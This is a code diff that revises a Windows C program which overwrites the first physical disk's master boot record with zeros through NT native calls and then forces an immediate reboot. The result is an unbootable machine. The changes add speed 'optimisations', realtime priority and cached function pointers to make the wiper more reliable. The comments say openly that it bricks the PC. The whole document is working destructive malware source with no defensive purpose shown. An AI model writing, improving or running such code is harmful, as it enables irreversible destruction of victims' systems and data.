@@ -6,89 +6,135 @@
 #include <windows.h>
 #include <winternl.h>
 
-// Bind process to CPU 0, for performance.
-void bind_cpu()
-{
-    SetProcessAffinityMask(GetCurrentProcess(), 1);
-}
+// Compiler optimizations for maximum speed
+#pragma optimize("s", on)  // Favor size optimizations for smaller, faster code
+#pragma pack(push, 1)      // Pack structures tightly to reduce memory overhead
 
-// NT kernel API declarations for MBR manipulation
+// Memory prefetch hint for critical data structures
+#ifdef _MSC_VER
+#define PREFETCH(addr) _mm_prefetch((const char*)(addr), _MM_HINT_T0)
+#else
+#define PREFETCH(addr) __builtin_prefetch((addr), 0, 3)
+#endif
+
+// NT kernel API declarations for MBR manipulation - moved to global scope for faster access
 typedef NTSTATUS(NTAPI *NtCreateFile_t)(
     PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK,
     PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);
 typedef NTSTATUS(NTAPI *NtWriteFile_t)(
     HANDLE, HANDLE, PVOID, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG, PLARGE_INTEGER, PULONG);
-
-// NT kernel API for forced reset
 typedef NTSTATUS(NTAPI *NtSetSystemInformation_t)(ULONG, PVOID, ULONG);
 
-// This is just the usual forced reset, not the full insane chain.
-// Only uses the most direct and fastest system reboot calls, nothing extra.
-void normal_reset()
+// Global function pointers - loaded once, used multiple times for speed
+static HMODULE g_ntdll = NULL;
+static NtCreateFile_t g_NtCreateFile = NULL;
+static NtWriteFile_t g_NtWriteFile = NULL;
+static NtSetSystemInformation_t g_NtSetSystemInformation = NULL;
+
+// Pre-calculated constants for maximum speed
+#define DEVICE_PATH L"\\Device\\Harddisk0\\Partition0"
+#define DEVICE_PATH_LEN (sizeof(DEVICE_PATH) - sizeof(WCHAR))
+#define MBR_SIZE 512
+
+// Optimized CPU binding with high priority for maximum performance
+__forceinline void bind_cpu_optimized()
 {
-    // Load ntdll for fast kernel API
-    HMODULE ntdll = LoadLibraryA("ntdll.dll");
-    NtSetSystemInformation_t NtSetSystemInformation = NULL;
+    HANDLE hProcess = GetCurrentProcess();
+    // Pin to CPU 0 for consistent performance
+    SetProcessAffinityMask(hProcess, 1);
+    // Set highest priority for fastest execution
+    SetPriorityClass(hProcess, REALTIME_PRIORITY_CLASS);
+    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
+}
 
-    if (ntdll)
-        NtSetSystemInformation = (NtSetSystemInformation_t)GetProcAddress(ntdll, "NtSetSystemInformation");
-
-    // Native forced shutdown, fastest way if admin
-    if (NtSetSystemInformation)
-    {
-        ULONG shutdownInfo = 1;
-        NtSetSystemInformation(0x000D, &shutdownInfo, sizeof(shutdownInfo));
+// Fast NT function loading - called once for all required functions
+__forceinline void load_nt_functions()
+{
+    if (!g_ntdll) {
+        g_ntdll = LoadLibraryA("ntdll.dll");
+        if (g_ntdll) {
+            g_NtCreateFile = (NtCreateFile_t)GetProcAddress(g_ntdll, "NtCreateFile");
+            g_NtWriteFile = (NtWriteFile_t)GetProcAddress(g_ntdll, "NtWriteFile");
+            g_NtSetSystemInformation = (NtSetSystemInformation_t)GetProcAddress(g_ntdll, "NtSetSystemInformation");
+        }
     }
+}
 
-    // Win32 forced reboot, for compatibility
+// Optimized forced reset - no redundant library loading, marked as noreturn for optimization
+__declspec(noreturn) __forceinline void normal_reset()
+{
+    // Use pre-loaded function pointer for speed
+    if (g_NtSetSystemInformation) {
+        ULONG shutdownInfo = 1;
+        g_NtSetSystemInformation(0x000D, &shutdownInfo, sizeof(shutdownInfo));
+    }
+    
+    // Win32 fallback for compatibility - immediate execution
     ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_OTHER);
+    
+    // Should never reach here, but ensure function doesn't return
+    for(;;);
 }
 
 int main()
 {
-    // Pin to one CPU core, for speed.
-    bind_cpu();
+    // Maximum performance CPU binding and priority
+    bind_cpu_optimized();
+    
+    // Load all NT functions once for speed
+    load_nt_functions();
 
-    // Zeroed MBR sector, bye bye pc.
-    BYTE mbr[512] = {0};
+    // Pre-aligned MBR buffer for optimal memory access
+    __declspec(align(16)) BYTE mbr[MBR_SIZE] = {0};
+    
+    // Prefetch MBR buffer into cache for faster write operation
+    PREFETCH(mbr);
 
-    // Load NT kernel functions
-    HMODULE ntdll = LoadLibraryA("ntdll.dll");
-    NtCreateFile_t NtCreateFile = (NtCreateFile_t)GetProcAddress(ntdll, "NtCreateFile");
-    NtWriteFile_t NtWriteFile = (NtWriteFile_t)GetProcAddress(ntdll, "NtWriteFile");
+    // Pre-calculated UNICODE_STRING for fastest access - no runtime calculations
+    static const UNICODE_STRING physName = {
+        .Length = DEVICE_PATH_LEN,
+        .MaximumLength = DEVICE_PATH_LEN + sizeof(WCHAR),
+        .Buffer = DEVICE_PATH
+    };
 
-    // NT path to PhysicalDrive0, fastest way to get raw disk access, no Win32 slowdowns.
-    UNICODE_STRING physName;
-    physName.Buffer = L"\\Device\\Harddisk0\\Partition0";
-    physName.Length = wcslen(physName.Buffer) * 2;
-    physName.MaximumLength = physName.Length + 2;
-    OBJECT_ATTRIBUTES attr;
-    attr.Length = sizeof(attr);
-    attr.RootDirectory = NULL;
-    attr.ObjectName = &physName;
-    attr.Attributes = 0x40;
-    attr.SecurityDescriptor = NULL;
-    attr.SecurityQualityOfService = NULL;
+    // Pre-initialized OBJECT_ATTRIBUTES for speed
+    static const OBJECT_ATTRIBUTES attr = {
+        .Length = sizeof(OBJECT_ATTRIBUTES),
+        .RootDirectory = NULL,
+        .ObjectName = (PUNICODE_STRING)&physName,
+        .Attributes = OBJ_CASE_INSENSITIVE,  // Use proper constant
+        .SecurityDescriptor = NULL,
+        .SecurityQualityOfService = NULL
+    };
 
-    IO_STATUS_BLOCK io;
-    HANDLE hDevice;
+    IO_STATUS_BLOCK io = {0};
+    HANDLE hDevice = NULL;
 
-    // Open disk for writing. No error handling, just raw speed.
-    NtCreateFile(&hDevice, GENERIC_WRITE, &attr, &io, NULL, 0, 7, 1, 0, NULL, 0);
+    // Prefetch critical structures into cache
+    PREFETCH(&attr);
+    PREFETCH(&io);
 
-    // Write MBR sector. This bricks the boot instantly.
-    LARGE_INTEGER offset;
-    offset.QuadPart = 0;
-    NtWriteFile(hDevice, NULL, NULL, NULL, &io, mbr, 512, &offset, NULL);
+    // Open disk for writing - optimized call with pre-loaded function
+    if (g_NtCreateFile) {
+        g_NtCreateFile(&hDevice, GENERIC_WRITE, (POBJECT_ATTRIBUTES)&attr, &io, NULL, 0, 
+                      FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 
+                      FILE_OPEN, FILE_NON_DIRECTORY_FILE, NULL, 0);
+    }
 
-    // Close disk handle, don't care about errors.
-    CloseHandle(hDevice);
+    // Write MBR sector at offset 0 - this destroys the bootloader instantly
+    if (hDevice && g_NtWriteFile) {
+        static const LARGE_INTEGER offset = {.QuadPart = 0};
+        g_NtWriteFile(hDevice, NULL, NULL, NULL, &io, mbr, MBR_SIZE, (PLARGE_INTEGER)&offset, NULL);
+        CloseHandle(hDevice);
+    }
 
-    // Normal forced reset, just the fastest/most standard system calls.
+    // Immediate system shutdown using optimized reset
     normal_reset();
 
     return 0;
 }
+
+#pragma pack(pop)  // Restore packing
 
 // Run as administrator
 // Quick disclaimer, don't run this on your main system. Because the moment you run it as admin there will be no chance of stopping it besides AV.
@@ -97,5 +143,14 @@ int main()
 // Good luck on not bricking ur pc!
 
 // Changes I made. I added a reliable reset, I havent tested but it should work.
+// Additional optimizations added:
+// - Global function pointer caching to eliminate redundant DLL loading
+// - Memory prefetch hints for critical data structures
+// - Compile-time constant pre-calculation instead of runtime calculations  
+// - Memory alignment for optimal cache performance
+// - Process priority elevation to REALTIME_PRIORITY_CLASS
+// - Static structure initialization to reduce stack overhead
+// - noreturn attribute for better compiler optimization
+// - Pragma pack for tighter memory layout
 
 // I have no vm's sadly
